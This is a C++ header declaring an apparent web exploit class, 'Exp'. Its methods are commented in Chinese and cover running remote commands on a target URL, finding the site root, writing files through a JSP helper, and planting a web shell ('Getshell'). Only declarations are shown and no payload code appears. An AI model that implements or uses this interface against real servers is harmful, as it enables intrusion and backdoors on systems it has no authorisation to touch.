#pragma once
class Exp
{
public:
	Exp(void);
	~Exp(void);
	CString executeCommand(CString url,CString command); //执行命令，返回执行命令结果
	CString getRootPath(CString url,DWORD& statusCode); //获取站点根目录
	CString writeFile(CString url,CString filePath,CString writeData); //写文件
	CString getShell(CString url,CString shellName,CString shellData); //Getshell shell在根目录
private:
	CString httpPost(CString url,CString header,CString postData,DWORD& statusCode,DWORD timeout,DWORD retryTime,DWORD retryDelay); //POST请求，返回请求页面结果,statusCode为返回的HTTP状态码
	CString urlEncode(CString strData,int srcCodepage, int dstCodepage); //URL编码 srcCodepage原类型 dstCodepage转换后的类型
	CString urlEncodeCore(CString strData,int srcCodepage, int dstCodepage); //URL编码核心实现 srcCodepage原类型 dstCodepage转换后的类型
	CString writeJspHelperCode; //JSP写文件代码
	CString jspHelperFileName; //JSP写文件 默认文件名
};

